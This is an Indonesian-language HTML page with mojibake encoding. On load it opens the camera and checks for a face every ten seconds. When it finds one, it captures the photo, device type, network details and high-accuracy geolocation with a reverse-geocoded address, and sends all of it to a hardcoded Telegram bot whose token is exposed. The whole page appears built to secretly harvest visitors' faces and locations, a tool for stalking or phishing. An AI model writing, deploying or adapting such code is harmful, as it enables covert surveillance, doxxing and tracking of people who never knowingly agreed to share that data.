â€<!DOCTYPE html>Â  <html lang="id">Â  
â€<head>Â  
â€Â  <meta charset="utf-8" />Â  
â€Â  <meta name="viewport" content="width=device-width,initial-scale=1" />Â  
â€Â  <title>ğŸ“¸ Auto Face Capture â†’ Telegram</title>Â  
â€Â  <style>Â  
â€Â Â Â  body {Â  
â€Â Â Â Â Â  margin: 0; font-family: Arial, sans-serif;Â  
â€Â Â Â Â Â  display: flex; flex-direction: column; align-items: center; justify-content: center;Â  
â€Â Â Â Â Â  background: #0d1117; color: #eee; height: 100vh;Â  
â€Â Â Â  }Â  
â€Â Â Â  video, canvas { border-radius: 10px; box-shadow: 0 0 20px #00ffff55; }Â  
â€Â Â Â  #info { margin-top: 12px; color: #ccc; font-size: 14px; max-width: 640px; text-align: center; }Â  
â€Â Â Â  #error { margin-top: 10px; color: #ff6666; }Â  
â€Â  </style>Â  
â€</head>Â  
â€<body>Â  
â€Â  <h2>ğŸ¤– Auto Face Detect â†’ Kirim ke Telegram</h2>Â  
â€Â  <video id="video" width="640" height="480" autoplay muted playsinline></video>Â  
â€Â  <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>Â  
â€Â  <div id="info">Menyiapkan sistem...</div>Â  
â€Â  <div id="error"></div>Â Â Â  <!-- face-api.js -->Â Â Â  <script src="https://cdn.jsdelivr.net/npm/face-api.js@0.22.2/dist/face-api.min.js"></script>Â Â Â  <script>Â  
â€Â  // ========== KONFIGURASI ==========Â  
â€Â  const BOT_TOKEN = "8414860263:AAFhAxcv1lWfhXCQB8h8BTjNFY6EB6P_jIc";Â  
â€Â  const CHAT_ID = "8471664635";Â  
â€Â  
â€Â  const MODEL_URL = "https://cdn.jsdelivr.net/gh/vladmandic/face-api/model/";Â  
â€Â  const DETECT_INTERVAL = 10000; // setiap 10 detikÂ  
â€Â  const video = document.getElementById('video');Â  
â€Â  const canvas = document.getElementById('canvas');Â  
â€Â  const ctx = canvas.getContext('2d');Â  
â€Â  const infoDiv = document.getElementById('info');Â  
â€Â  const errorDiv = document.getElementById('error');Â  
â€Â  
â€Â  // ==== Utility: Deteksi device, jaringan, lokasi ====Â  
â€Â  function detectDevice() {Â  
â€Â Â Â  const ua = navigator.userAgent.toLowerCase();Â  
â€Â Â Â  let brand = "Unknown";Â  
â€Â Â Â  if (/iphone|ipad/.test(ua)) brand = "Apple (iPhone/iPad)";Â  
â€Â Â Â  else if (/android/.test(ua)) {Â  
â€Â Â Â Â Â  if (/samsung/.test(ua)) brand = "Samsung";Â  
â€Â Â Â Â Â  else if (/huawei|honor/.test(ua)) brand = "Huawei/Honor";Â  
â€Â Â Â Â Â  else if (/xiaomi|redmi|poco/.test(ua)) brand = "Xiaomi/Poco";Â  
â€Â Â Â Â Â  else if (/oppo/.test(ua)) brand = "OPPO";Â  
â€Â Â Â Â Â  else if (/vivo/.test(ua)) brand = "Vivo";Â  
â€Â Â Â Â Â  else brand = "Android (lainnya)";Â  
â€Â Â Â  } else if (/windows/.test(ua)) brand = "Windows PC";Â  
â€Â Â Â  else if (/macintosh/.test(ua)) brand = "MacOS";Â  
â€Â Â Â  else if (/linux/.test(ua)) brand = "Linux";Â  
â€Â Â Â  return { brand, ua };Â  
â€Â  }Â  
â€Â  
â€Â  function getNetworkInfo() {Â  
â€Â Â Â  const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;Â  
â€Â Â Â  return {Â  
â€Â Â Â Â Â  type: conn ? conn.effectiveType : "unknown",Â  
â€Â Â Â Â Â  downlink: conn ? conn.downlink : "n/a",Â  
â€Â Â Â Â Â  rtt: conn ? conn.rtt : "n/a"Â  
â€Â Â Â  };Â  
â€Â  }Â  
â€Â  
â€Â  async function getLocation() {Â  
â€Â Â Â  return new Promise(resolve => {Â  
â€Â Â Â Â Â  if (!navigator.geolocation) return resolve(null);Â  
â€Â Â Â Â Â  navigator.geolocation.getCurrentPosition(Â  
â€Â Â Â Â Â Â Â  pos => resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude }),Â  
â€Â Â Â Â Â Â Â  () => resolve(null),Â  
â€Â Â Â Â Â Â Â  { enableHighAccuracy: true, timeout: 7000 }Â  
â€Â Â Â Â Â  );Â  
â€Â Â Â  });Â  
â€Â  }Â  
â€Â  
â€Â  async function reverseGeocode(lat, lon) {Â  
â€Â Â Â  try {Â  
â€Â Â Â Â Â  const r = await fetch(`https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${lat}&lon=${lon}`);Â  
â€Â Â Â Â Â  const d = await r.json();Â  
â€Â Â Â Â Â  return d.display_name || null;Â  
â€Â Â Â  } catch {Â  
â€Â Â Â Â Â  return null;Â  
â€Â Â Â  }Â  
â€Â  }Â  
â€Â  
â€Â  // ==== Kirim ke Telegram ====Â  
â€Â  async function sendToTelegram(photoBlob, caption) {Â  
â€Â Â Â  const fd = new FormData();Â  
â€Â Â Â  fd.append("chat_id", CHAT_ID);Â  
â€Â Â Â  fd.append("caption", caption);Â  
â€Â Â Â  fd.append("photo", photoBlob, "face.jpg");Â  
â€Â Â Â  const resp = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: "POST", body: fd });Â  
â€Â Â Â  if (!resp.ok) throw new Error("Gagal kirim ke Telegram (" + resp.status + ")");Â  
â€Â  }Â  
â€Â  
â€Â  // ==== Ambil Foto & Kirim ====Â  
â€Â  async function captureAndSend() {Â  
â€Â Â Â  ctx.drawImage(video, 0, 0, canvas.width, canvas.height);Â  
â€Â Â Â  const detections = await faceapi.detectAllFaces(canvas, new faceapi.TinyFaceDetectorOptions());Â  
â€Â Â Â  if (detections.length === 0) {Â  
â€Â Â Â Â Â  console.log("âŒ Tidak ada wajah terdeteksi");Â  
â€Â Â Â Â Â  infoDiv.textContent = "Tidak ada wajah, mencoba lagi...";Â  
â€Â Â Â Â Â  return;Â  
â€Â Â Â  }Â  
â€Â  
â€Â Â Â  infoDiv.textContent = `âœ… ${detections.length} wajah terdeteksi, sedang kirim...`;Â  
â€Â Â Â  const device = detectDevice();Â  
â€Â Â Â  const net = getNetworkInfo();Â  
â€Â Â Â  const loc = await getLocation();Â  
â€Â Â Â  let locText = "Tidak diketahui";Â  
â€Â Â Â  if (loc) {Â  
â€Â Â Â Â Â  const geo = await reverseGeocode(loc.lat, loc.lon);Â  
â€Â Â Â Â Â  locText = `${loc.lat.toFixed(6)}, ${loc.lon.toFixed(6)}\n${geo || ""}`;Â  
â€Â Â Â  }Â  
â€Â  
â€Â Â Â  const caption = `ğŸ“¸ Deteksi Wajah Otomatis\n` +Â  
â€Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â  `ğŸ“± Device: ${device.brand}\n` +Â  
â€Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â  `ğŸŒ Jaringan: ${net.type} (${net.downlink} Mbps)\n` +Â  
â€Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â  `ğŸ“ Lokasi: ${locText}\n` +Â  
â€Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â  `ğŸ•’ ${new Date().toLocaleString()}`;Â  
â€Â  
â€Â Â Â  canvas.toBlob(async blob => {Â  
â€Â Â Â Â Â  try {Â  
â€Â Â Â Â Â Â Â  await sendToTelegram(blob, caption);Â  
â€Â Â Â Â Â Â Â  infoDiv.textContent = "âœ… Data terkirim ke Telegram (" + new Date().toLocaleTimeString() + ")";Â  
â€Â Â Â Â Â  } catch (e) {Â  
â€Â Â Â Â Â Â Â  errorDiv.textContent = "Gagal kirim: " + e.message;Â  
â€Â Â Â Â Â  }Â  
â€Â Â Â  }, 'image/jpeg', 0.9);Â  
â€Â  }Â  
â€Â  
â€Â  // ==== Inisialisasi ====Â  
â€Â  async function init() {Â  
â€Â Â Â  try {Â  
â€Â Â Â Â Â  infoDiv.textContent = "Memuat model AI...";Â  
â€Â Â Â Â Â  await faceapi.nets.tinyFaceDetector.loadFromUri(MODEL_URL);Â  
â€Â  
â€Â Â Â Â Â  const stream = await navigator.mediaDevices.getUserMedia({ video: true });Â  
â€Â Â Â Â Â  video.srcObject = stream;Â  
â€Â Â Â Â Â  await video.play();Â  
â€Â  
â€Â Â Â Â Â  infoDiv.textContent = "Kamera aktif, mendeteksi otomatis...";Â  
â€Â Â Â Â Â  setInterval(captureAndSend, DETECT_INTERVAL);Â  
â€Â Â Â  } catch (e) {Â  
â€Â Â Â Â Â  errorDiv.textContent = "âŒ Error: " + e.message;Â  
â€Â Â Â Â Â  infoDiv.textContent = "Tidak bisa mengakses kamera.";Â  
â€Â Â Â  }Â  
â€Â  }Â  
â€Â  
â€Â  window.addEventListener("load", init);Â  
â€Â  </script>Â  </body>Â  
â€</html>
